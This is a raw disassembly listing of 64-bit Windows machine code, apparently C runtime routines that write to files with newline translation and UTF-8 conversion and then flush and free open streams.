   14000a9c2:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000a9c6:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000a9ca:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000a9cf:	33 c0                	xor    %eax,%eax
   14000a9d1:	48 89 07             	mov    %rax,(%rdi)
   14000a9d4:	89 47 08             	mov    %eax,0x8(%rdi)
   14000a9d7:	4c 3b c5             	cmp    %rbp,%r8
   14000a9da:	0f 83 82 00 00 00    	jae    0x14000aa62
   14000a9e0:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000a9e5:	48 3b f5             	cmp    %rbp,%rsi
   14000a9e8:	73 31                	jae    0x14000aa1b
   14000a9ea:	0f b7 06             	movzwl (%rsi),%eax
   14000a9ed:	48 83 c6 02          	add    $0x2,%rsi
   14000a9f1:	66 83 f8 0a          	cmp    $0xa,%ax
   14000a9f5:	75 10                	jne    0x14000aa07
   14000a9f7:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000a9fb:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000aa00:	66 89 0b             	mov    %cx,(%rbx)
   14000aa03:	48 83 c3 02          	add    $0x2,%rbx
   14000aa07:	66 89 03             	mov    %ax,(%rbx)
   14000aa0a:	48 83 c3 02          	add    $0x2,%rbx
   14000aa0e:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000aa15:	00 
   14000aa16:	48 3b d8             	cmp    %rax,%rbx
   14000aa19:	72 ca                	jb     0x14000a9e5
   14000aa1b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000aa21:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000aa26:	48 2b d8             	sub    %rax,%rbx
   14000aa29:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000aa2e:	48 d1 fb             	sar    $1,%rbx
   14000aa31:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000aa36:	03 db                	add    %ebx,%ebx
   14000aa38:	49 8b ce             	mov    %r14,%rcx
   14000aa3b:	44 8b c3             	mov    %ebx,%r8d
   14000aa3e:	ff 15 34 26 00 00    	call   *0x2634(%rip)        # 0x14000d078
   14000aa44:	85 c0                	test   %eax,%eax
   14000aa46:	74 12                	je     0x14000aa5a
   14000aa48:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000aa4c:	01 47 04             	add    %eax,0x4(%rdi)
   14000aa4f:	3b c3                	cmp    %ebx,%eax
   14000aa51:	72 0f                	jb     0x14000aa62
   14000aa53:	48 3b f5             	cmp    %rbp,%rsi
   14000aa56:	72 88                	jb     0x14000a9e0
   14000aa58:	eb 08                	jmp    0x14000aa62
   14000aa5a:	ff 15 b8 25 00 00    	call   *0x25b8(%rip)        # 0x14000d018
   14000aa60:	89 07                	mov    %eax,(%rdi)
   14000aa62:	48 8b c7             	mov    %rdi,%rax
   14000aa65:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000aa6c:	00 
   14000aa6d:	48 33 cc             	xor    %rsp,%rcx
   14000aa70:	e8 0b 6b ff ff       	call   0x140001580
   14000aa75:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000aa7c:	00 
   14000aa7d:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000aa81:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000aa85:	49 8b e3             	mov    %r11,%rsp
   14000aa88:	41 5e                	pop    %r14
   14000aa8a:	5f                   	pop    %rdi
   14000aa8b:	5e                   	pop    %rsi
   14000aa8c:	c3                   	ret
   14000aa8d:	cc                   	int3
   14000aa8e:	cc                   	int3
   14000aa8f:	cc                   	int3
   14000aa90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aa95:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000aa9a:	56                   	push   %rsi
   14000aa9b:	57                   	push   %rdi
   14000aa9c:	41 54                	push   %r12
   14000aa9e:	41 56                	push   %r14
   14000aaa0:	41 57                	push   %r15
   14000aaa2:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000aaa7:	e8 84 1e 00 00       	call   0x14000c930
   14000aaac:	48 2b e0             	sub    %rax,%rsp
   14000aaaf:	48 8b 05 4a c5 00 00 	mov    0xc54a(%rip),%rax        # 0x140017000
   14000aab6:	48 33 c4             	xor    %rsp,%rax
   14000aab9:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000aac0:	00 
   14000aac1:	4c 63 d2             	movslq %edx,%r10
   14000aac4:	48 8b d9             	mov    %rcx,%rbx
   14000aac7:	49 8b c2             	mov    %r10,%rax
   14000aaca:	45 8b f1             	mov    %r9d,%r14d
   14000aacd:	48 c1 f8 06          	sar    $0x6,%rax
   14000aad1:	48 8d 0d f8 dc 00 00 	lea    0xdcf8(%rip),%rcx        # 0x1400187d0
   14000aad8:	41 83 e2 3f          	and    $0x3f,%r10d
   14000aadc:	4d 03 f0             	add    %r8,%r14
   14000aadf:	4d 8b f8             	mov    %r8,%r15
   14000aae2:	49 8b f8             	mov    %r8,%rdi
   14000aae5:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000aae9:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000aaed:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000aaf2:	33 c0                	xor    %eax,%eax
   14000aaf4:	48 89 03             	mov    %rax,(%rbx)
   14000aaf7:	4d 3b c6             	cmp    %r14,%r8
   14000aafa:	89 43 08             	mov    %eax,0x8(%rbx)
   14000aafd:	0f 83 ce 00 00 00    	jae    0x14000abd1
   14000ab03:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000ab08:	49 3b fe             	cmp    %r14,%rdi
   14000ab0b:	73 2d                	jae    0x14000ab3a
   14000ab0d:	0f b7 0f             	movzwl (%rdi),%ecx
   14000ab10:	48 83 c7 02          	add    $0x2,%rdi
   14000ab14:	66 83 f9 0a          	cmp    $0xa,%cx
   14000ab18:	75 0c                	jne    0x14000ab26
   14000ab1a:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000ab1f:	66 89 10             	mov    %dx,(%rax)
   14000ab22:	48 83 c0 02          	add    $0x2,%rax
   14000ab26:	66 89 08             	mov    %cx,(%rax)
   14000ab29:	48 83 c0 02          	add    $0x2,%rax
   14000ab2d:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000ab34:	00 
   14000ab35:	48 3b c1             	cmp    %rcx,%rax
   14000ab38:	72 ce                	jb     0x14000ab08
   14000ab3a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000ab40:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000ab45:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ab4b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000ab50:	48 2b c1             	sub    %rcx,%rax
   14000ab53:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000ab5a:	00 
   14000ab5b:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000ab62:	00 
   14000ab63:	48 d1 f8             	sar    $1,%rax
   14000ab66:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000ab6b:	44 8b c8             	mov    %eax,%r9d
   14000ab6e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000ab73:	33 d2                	xor    %edx,%edx
   14000ab75:	e8 9e cd ff ff       	call   0x140007918
   14000ab7a:	8b e8                	mov    %eax,%ebp
   14000ab7c:	85 c0                	test   %eax,%eax
   14000ab7e:	74 49                	je     0x14000abc9
   14000ab80:	33 f6                	xor    %esi,%esi
   14000ab82:	85 c0                	test   %eax,%eax
   14000ab84:	74 33                	je     0x14000abb9
   14000ab86:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ab8c:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000ab93:	00 
   14000ab94:	8b ce                	mov    %esi,%ecx
   14000ab96:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000ab9b:	44 8b c5             	mov    %ebp,%r8d
   14000ab9e:	48 03 d1             	add    %rcx,%rdx
   14000aba1:	49 8b cc             	mov    %r12,%rcx
   14000aba4:	44 2b c6             	sub    %esi,%r8d
   14000aba7:	ff 15 cb 24 00 00    	call   *0x24cb(%rip)        # 0x14000d078
   14000abad:	85 c0                	test   %eax,%eax
   14000abaf:	74 18                	je     0x14000abc9
   14000abb1:	03 74 24 40          	add    0x40(%rsp),%esi
   14000abb5:	3b f5                	cmp    %ebp,%esi
   14000abb7:	72 cd                	jb     0x14000ab86
   14000abb9:	8b c7                	mov    %edi,%eax
   14000abbb:	41 2b c7             	sub    %r15d,%eax
   14000abbe:	89 43 04             	mov    %eax,0x4(%rbx)
   14000abc1:	49 3b fe             	cmp    %r14,%rdi
   14000abc4:	e9 34 ff ff ff       	jmp    0x14000aafd
   14000abc9:	ff 15 49 24 00 00    	call   *0x2449(%rip)        # 0x14000d018
   14000abcf:	89 03                	mov    %eax,(%rbx)
   14000abd1:	48 8b c3             	mov    %rbx,%rax
   14000abd4:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000abdb:	00 
   14000abdc:	48 33 cc             	xor    %rsp,%rcx
   14000abdf:	e8 9c 69 ff ff       	call   0x140001580
   14000abe4:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000abeb:	00 
   14000abec:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000abf0:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000abf4:	49 8b e3             	mov    %r11,%rsp
   14000abf7:	41 5f                	pop    %r15
   14000abf9:	41 5e                	pop    %r14
   14000abfb:	41 5c                	pop    %r12
   14000abfd:	5f                   	pop    %rdi
   14000abfe:	5e                   	pop    %rsi
   14000abff:	c3                   	ret
   14000ac00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000ac05:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000ac0a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000ac0e:	57                   	push   %rdi
   14000ac0f:	41 54                	push   %r12
   14000ac11:	41 55                	push   %r13
   14000ac13:	41 56                	push   %r14
   14000ac15:	41 57                	push   %r15
   14000ac17:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac1b:	45 8b f0             	mov    %r8d,%r14d
   14000ac1e:	4c 8b fa             	mov    %rdx,%r15
   14000ac21:	48 63 d9             	movslq %ecx,%rbx
   14000ac24:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000ac27:	75 18                	jne    0x14000ac41
   14000ac29:	e8 42 ad ff ff       	call   0x140005970
   14000ac2e:	83 20 00             	andl   $0x0,(%rax)
   14000ac31:	e8 5a ad ff ff       	call   0x140005990
   14000ac36:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ac3c:	e9 8f 00 00 00       	jmp    0x14000acd0
   14000ac41:	85 c9                	test   %ecx,%ecx
   14000ac43:	78 73                	js     0x14000acb8
   14000ac45:	3b 1d 85 df 00 00    	cmp    0xdf85(%rip),%ebx        # 0x140018bd0
   14000ac4b:	73 6b                	jae    0x14000acb8
   14000ac4d:	48 8b c3             	mov    %rbx,%rax
   14000ac50:	48 8b f3             	mov    %rbx,%rsi
   14000ac53:	48 c1 fe 06          	sar    $0x6,%rsi
   14000ac57:	4c 8d 2d 72 db 00 00 	lea    0xdb72(%rip),%r13        # 0x1400187d0
   14000ac5e:	83 e0 3f             	and    $0x3f,%eax
   14000ac61:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000ac65:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000ac6a:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000ac70:	74 46                	je     0x14000acb8
   14000ac72:	8b cb                	mov    %ebx,%ecx
   14000ac74:	e8 2f d0 ff ff       	call   0x140007ca8
   14000ac79:	83 cf ff             	or     $0xffffffff,%edi
   14000ac7c:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000ac81:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000ac87:	75 15                	jne    0x14000ac9e
   14000ac89:	e8 02 ad ff ff       	call   0x140005990
   14000ac8e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ac94:	e8 d7 ac ff ff       	call   0x140005970
   14000ac99:	83 20 00             	andl   $0x0,(%rax)
   14000ac9c:	eb 0f                	jmp    0x14000acad
   14000ac9e:	45 8b c6             	mov    %r14d,%r8d
   14000aca1:	49 8b d7             	mov    %r15,%rdx
   14000aca4:	8b cb                	mov    %ebx,%ecx
   14000aca6:	e8 41 00 00 00       	call   0x14000acec
   14000acab:	8b f8                	mov    %eax,%edi
   14000acad:	8b cb                	mov    %ebx,%ecx
   14000acaf:	e8 1c d0 ff ff       	call   0x140007cd0
   14000acb4:	8b c7                	mov    %edi,%eax
   14000acb6:	eb 1b                	jmp    0x14000acd3
   14000acb8:	e8 b3 ac ff ff       	call   0x140005970
   14000acbd:	83 20 00             	andl   $0x0,(%rax)
   14000acc0:	e8 cb ac ff ff       	call   0x140005990
   14000acc5:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000accb:	e8 a0 ab ff ff       	call   0x140005870
   14000acd0:	83 c8 ff             	or     $0xffffffff,%eax
   14000acd3:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000acd8:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000acdd:	48 83 c4 20          	add    $0x20,%rsp
   14000ace1:	41 5f                	pop    %r15
   14000ace3:	41 5e                	pop    %r14
   14000ace5:	41 5d                	pop    %r13
   14000ace7:	41 5c                	pop    %r12
   14000ace9:	5f                   	pop    %rdi
   14000acea:	c3                   	ret
   14000aceb:	cc                   	int3
   14000acec:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000acf1:	55                   	push   %rbp
   14000acf2:	56                   	push   %rsi
   14000acf3:	57                   	push   %rdi
   14000acf4:	41 54                	push   %r12
   14000acf6:	41 55                	push   %r13
   14000acf8:	41 56                	push   %r14
   14000acfa:	41 57                	push   %r15
   14000acfc:	48 8b ec             	mov    %rsp,%rbp
   14000acff:	48 83 ec 60          	sub    $0x60,%rsp
   14000ad03:	33 db                	xor    %ebx,%ebx
   14000ad05:	45 8b f0             	mov    %r8d,%r14d
   14000ad08:	4c 63 e1             	movslq %ecx,%r12
   14000ad0b:	48 8b fa             	mov    %rdx,%rdi
   14000ad0e:	45 85 c0             	test   %r8d,%r8d
   14000ad11:	0f 84 9e 02 00 00    	je     0x14000afb5
   14000ad17:	48 85 d2             	test   %rdx,%rdx
   14000ad1a:	75 1f                	jne    0x14000ad3b
   14000ad1c:	e8 4f ac ff ff       	call   0x140005970
   14000ad21:	89 18                	mov    %ebx,(%rax)
   14000ad23:	e8 68 ac ff ff       	call   0x140005990
   14000ad28:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000ad2e:	e8 3d ab ff ff       	call   0x140005870
   14000ad33:	83 c8 ff             	or     $0xffffffff,%eax
   14000ad36:	e9 7c 02 00 00       	jmp    0x14000afb7
   14000ad3b:	49 8b c4             	mov    %r12,%rax
   14000ad3e:	48 8d 0d 8b da 00 00 	lea    0xda8b(%rip),%rcx        # 0x1400187d0
   14000ad45:	83 e0 3f             	and    $0x3f,%eax
   14000ad48:	4d 8b ec             	mov    %r12,%r13
   14000ad4b:	49 c1 fd 06          	sar    $0x6,%r13
   14000ad4f:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000ad53:	4a 8b 0c e9          	mov    (%rcx,%r13,8),%rcx
   14000ad57:	42 0f be 74 f9 39    	movsbl 0x39(%rcx,%r15,8),%esi
   14000ad5d:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000ad60:	3c 01                	cmp    $0x1,%al
   14000ad62:	77 09                	ja     0x14000ad6d
   14000ad64:	41 8b c6             	mov    %r14d,%eax
   14000ad67:	f7 d0                	not    %eax
   14000ad69:	a8 01                	test   $0x1,%al
   14000ad6b:	74 af                	je     0x14000ad1c
   14000ad6d:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   14000ad73:	74 0e                	je     0x14000ad83
   14000ad75:	33 d2                	xor    %edx,%edx
   14000ad77:	41 8b cc             	mov    %r12d,%ecx
   14000ad7a:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000ad7e:	e8 55 06 00 00       	call   0x14000b3d8
   14000ad83:	41 8b cc             	mov    %r12d,%ecx
   14000ad86:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   14000ad8a:	e8 35 03 00 00       	call   0x14000b0c4
   14000ad8f:	85 c0                	test   %eax,%eax
   14000ad91:	0f 84 0b 01 00 00    	je     0x14000aea2
   14000ad97:	48 8d 05 32 da 00 00 	lea    0xda32(%rip),%rax        # 0x1400187d0
   14000ad9e:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000ada2:	42 38 5c f8 38       	cmp    %bl,0x38(%rax,%r15,8)
   14000ada7:	0f 8d f5 00 00 00    	jge    0x14000aea2
   14000adad:	e8 02 a6 ff ff       	call   0x1400053b4
   14000adb2:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000adb9:	48 39 99 38 01 00 00 	cmp    %rbx,0x138(%rcx)
   14000adc0:	75 16                	jne    0x14000add8
   14000adc2:	48 8d 05 07 da 00 00 	lea    0xda07(%rip),%rax        # 0x1400187d0
   14000adc9:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000adcd:	42 38 5c f8 39       	cmp    %bl,0x39(%rax,%r15,8)
   14000add2:	0f 84 ca 00 00 00    	je     0x14000aea2
   14000add8:	48 8d 05 f1 d9 00 00 	lea    0xd9f1(%rip),%rax        # 0x1400187d0
   14000addf:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000ade3:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000ade7:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000adec:	ff 15 b6 22 00 00    	call   *0x22b6(%rip)        # 0x14000d0a8
   14000adf2:	85 c0                	test   %eax,%eax
   14000adf4:	0f 84 a8 00 00 00    	je     0x14000aea2
   14000adfa:	40 84 f6             	test   %sil,%sil
   14000adfd:	0f 84 81 00 00 00    	je     0x14000ae84
   14000ae03:	40 fe ce             	dec    %sil
   14000ae06:	40 80 fe 01          	cmp    $0x1,%sil
   14000ae0a:	0f 87 2e 01 00 00    	ja     0x14000af3e
   14000ae10:	4e 8d 24 37          	lea    (%rdi,%r14,1),%r12
   14000ae14:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   14000ae18:	4c 8b f7             	mov    %rdi,%r14
   14000ae1b:	49 3b fc             	cmp    %r12,%rdi
   14000ae1e:	0f 83 10 01 00 00    	jae    0x14000af34
   14000ae24:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   14000ae27:	41 0f b7 06          	movzwl (%r14),%eax
   14000ae2b:	0f b7 c8             	movzwl %ax,%ecx
   14000ae2e:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   14000ae32:	e8 a9 05 00 00       	call   0x14000b3e0
   14000ae37:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   14000ae3b:	66 3b c1             	cmp    %cx,%ax
   14000ae3e:	75 36                	jne    0x14000ae76
   14000ae40:	83 c6 02             	add    $0x2,%esi
   14000ae43:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000ae46:	66 83 f9 0a          	cmp    $0xa,%cx
   14000ae4a:	75 1b                	jne    0x14000ae67
   14000ae4c:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000ae51:	e8 8a 05 00 00       	call   0x14000b3e0
   14000ae56:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000ae5b:	66 3b c1             	cmp    %cx,%ax
   14000ae5e:	75 16                	jne    0x14000ae76
   14000ae60:	ff c6                	inc    %esi
   14000ae62:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000ae65:	ff c3                	inc    %ebx
   14000ae67:	49 83 c6 02          	add    $0x2,%r14
   14000ae6b:	4d 3b f4             	cmp    %r12,%r14
   14000ae6e:	0f 83 c0 00 00 00    	jae    0x14000af34
   14000ae74:	eb b1                	jmp    0x14000ae27
   14000ae76:	ff 15 9c 21 00 00    	call   *0x219c(%rip)        # 0x14000d018
   14000ae7c:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000ae7f:	e9 b0 00 00 00       	jmp    0x14000af34
   14000ae84:	45 8b ce             	mov    %r14d,%r9d
   14000ae87:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000ae8b:	4c 8b c7             	mov    %rdi,%r8
   14000ae8e:	41 8b d4             	mov    %r12d,%edx
   14000ae91:	e8 ee f4 ff ff       	call   0x14000a384
   14000ae96:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000ae9a:	8b 58 08             	mov    0x8(%rax),%ebx
   14000ae9d:	e9 97 00 00 00       	jmp    0x14000af39
   14000aea2:	48 8d 05 27 d9 00 00 	lea    0xd927(%rip),%rax        # 0x1400187d0
   14000aea9:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000aead:	42 38 5c f9 38       	cmp    %bl,0x38(%rcx,%r15,8)
   14000aeb2:	7d 4d                	jge    0x14000af01
   14000aeb4:	8b ce                	mov    %esi,%ecx
   14000aeb6:	40 84 f6             	test   %sil,%sil
   14000aeb9:	74 32                	je     0x14000aeed
   14000aebb:	83 e9 01             	sub    $0x1,%ecx
   14000aebe:	74 19                	je     0x14000aed9
   14000aec0:	83 f9 01             	cmp    $0x1,%ecx
   14000aec3:	75 79                	jne    0x14000af3e
   14000aec5:	45 8b ce             	mov    %r14d,%r9d
   14000aec8:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000aecc:	4c 8b c7             	mov    %rdi,%r8
   14000aecf:	41 8b d4             	mov    %r12d,%edx
   14000aed2:	e8 9d fa ff ff       	call   0x14000a974
   14000aed7:	eb bd                	jmp    0x14000ae96
   14000aed9:	45 8b ce             	mov    %r14d,%r9d
   14000aedc:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000aee0:	4c 8b c7             	mov    %rdi,%r8
   14000aee3:	41 8b d4             	mov    %r12d,%edx
   14000aee6:	e8 a5 fb ff ff       	call   0x14000aa90
   14000aeeb:	eb a9                	jmp    0x14000ae96
   14000aeed:	45 8b ce             	mov    %r14d,%r9d
   14000aef0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000aef4:	4c 8b c7             	mov    %rdi,%r8
   14000aef7:	41 8b d4             	mov    %r12d,%edx
   14000aefa:	e8 71 f9 ff ff       	call   0x14000a870
   14000aeff:	eb 95                	jmp    0x14000ae96
   14000af01:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000af06:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000af0a:	33 c0                	xor    %eax,%eax
   14000af0c:	45 8b c6             	mov    %r14d,%r8d
   14000af0f:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000af14:	48 8b d7             	mov    %rdi,%rdx
   14000af17:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000af1b:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000af1e:	ff 15 54 21 00 00    	call   *0x2154(%rip)        # 0x14000d078
   14000af24:	85 c0                	test   %eax,%eax
   14000af26:	75 09                	jne    0x14000af31
   14000af28:	ff 15 ea 20 00 00    	call   *0x20ea(%rip)        # 0x14000d018
   14000af2e:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000af31:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   14000af34:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000af39:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000af3e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000af42:	48 c1 e8 20          	shr    $0x20,%rax
   14000af46:	85 c0                	test   %eax,%eax
   14000af48:	75 64                	jne    0x14000afae
   14000af4a:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000af4d:	85 c0                	test   %eax,%eax
   14000af4f:	74 2d                	je     0x14000af7e
   14000af51:	83 f8 05             	cmp    $0x5,%eax
   14000af54:	75 1b                	jne    0x14000af71
   14000af56:	e8 35 aa ff ff       	call   0x140005990
   14000af5b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000af61:	e8 0a aa ff ff       	call   0x140005970
   14000af66:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   14000af6c:	e9 c2 fd ff ff       	jmp    0x14000ad33
   14000af71:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000af74:	e8 a7 a9 ff ff       	call   0x140005920
   14000af79:	e9 b5 fd ff ff       	jmp    0x14000ad33
   14000af7e:	48 8d 05 4b d8 00 00 	lea    0xd84b(%rip),%rax        # 0x1400187d0
   14000af85:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000af89:	42 f6 44 f8 38 40    	testb  $0x40,0x38(%rax,%r15,8)
   14000af8f:	74 05                	je     0x14000af96
   14000af91:	80 3f 1a             	cmpb   $0x1a,(%rdi)
   14000af94:	74 1f                	je     0x14000afb5
   14000af96:	e8 f5 a9 ff ff       	call   0x140005990
   14000af9b:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   14000afa1:	e8 ca a9 ff ff       	call   0x140005970
   14000afa6:	83 20 00             	andl   $0x0,(%rax)
   14000afa9:	e9 85 fd ff ff       	jmp    0x14000ad33
   14000afae:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000afb1:	2b c3                	sub    %ebx,%eax
   14000afb3:	eb 02                	jmp    0x14000afb7
   14000afb5:	33 c0                	xor    %eax,%eax
   14000afb7:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   14000afbe:	00 
   14000afbf:	48 83 c4 60          	add    $0x60,%rsp
   14000afc3:	41 5f                	pop    %r15
   14000afc5:	41 5e                	pop    %r14
   14000afc7:	41 5d                	pop    %r13
   14000afc9:	41 5c                	pop    %r12
   14000afcb:	5f                   	pop    %rdi
   14000afcc:	5e                   	pop    %rsi
   14000afcd:	5d                   	pop    %rbp
   14000afce:	c3                   	ret
   14000afcf:	cc                   	int3
   14000afd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000afd5:	57                   	push   %rdi
   14000afd6:	48 83 ec 30          	sub    $0x30,%rsp
   14000afda:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000afdf:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000afe4:	e8 3f b0 ff ff       	call   0x140006028
   14000afe9:	90                   	nop
   14000afea:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000afef:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000aff3:	3b 1d 0f dc 00 00    	cmp    0xdc0f(%rip),%ebx        # 0x140018c08
   14000aff9:	74 6d                	je     0x14000b068
   14000affb:	48 63 fb             	movslq %ebx,%rdi
   14000affe:	48 8b 05 0b dc 00 00 	mov    0xdc0b(%rip),%rax        # 0x140018c10
   14000b005:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b009:	48 85 c9             	test   %rcx,%rcx
   14000b00c:	75 02                	jne    0x14000b010
   14000b00e:	eb 54                	jmp    0x14000b064
   14000b010:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b013:	c1 e8 0d             	shr    $0xd,%eax
   14000b016:	a8 01                	test   $0x1,%al
   14000b018:	74 19                	je     0x14000b033
   14000b01a:	48 8b 0d ef db 00 00 	mov    0xdbef(%rip),%rcx        # 0x140018c10
   14000b021:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b025:	e8 76 04 00 00       	call   0x14000b4a0
   14000b02a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b02d:	74 04                	je     0x14000b033
   14000b02f:	ff 44 24 20          	incl   0x20(%rsp)
   14000b033:	48 8b 05 d6 db 00 00 	mov    0xdbd6(%rip),%rax        # 0x140018c10
   14000b03a:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b03e:	48 83 c1 30          	add    $0x30,%rcx
   14000b042:	ff 15 18 21 00 00    	call   *0x2118(%rip)        # 0x14000d160
   14000b048:	48 8b 0d c1 db 00 00 	mov    0xdbc1(%rip),%rcx        # 0x140018c10
   14000b04f:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b053:	e8 18 b1 ff ff       	call   0x140006170
   14000b058:	48 8b 05 b1 db 00 00 	mov    0xdbb1(%rip),%rax        # 0x140018c10
   14000b05f:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000b064:	ff c3                	inc    %ebx
   14000b066:	eb 87                	jmp    0x14000afef
   14000b068:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000b06d:	e8 0a b0 ff ff       	call   0x14000607c
   14000b072:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000b076:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b07b:	48 83 c4 30          	add    $0x30,%rsp
   14000b07f:	5f                   	pop    %rdi
   14000b080:	c3                   	ret
   14000b081:	cc                   	int3
   14000b082:	cc                   	int3
   14000b083:	cc                   	int3
   14000b084:	40 53                	rex push %rbx
   14000b086:	48 83 ec 20          	sub    $0x20,%rsp
